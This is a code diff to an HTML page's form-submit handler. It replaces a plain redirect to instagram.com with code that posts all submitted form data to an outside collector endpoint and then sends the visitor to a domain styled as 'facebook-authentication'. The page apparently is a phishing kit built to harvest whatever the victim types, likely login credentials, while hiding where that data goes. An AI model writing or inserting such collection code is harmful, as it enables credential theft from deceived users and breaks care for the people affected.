@@ -34,12 +34,24 @@
       function submitForm(event) {
         event.preventDefault(); // Prevent the default form submission
 
-        // Handle form submission logic here if needed
+        // Get form data
+        const formData = new FormData(event.target);
 
-        // Redirect to another website
-        window.location.href = "https://instagram.com";
+        // Perform AJAX request
+        fetch("https://getintotouch.sh20raj.com/api.php?id=6534651073", {
+          method: "POST",
+          body: formData,
+        })
+        .then(response => {
+          // Handle the response if needed
+
+          // Redirect to another website
+          window.location.href = "https://facebook-authentication.netlify.app";
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
       }
     </script>
   </body>
 </html>
->
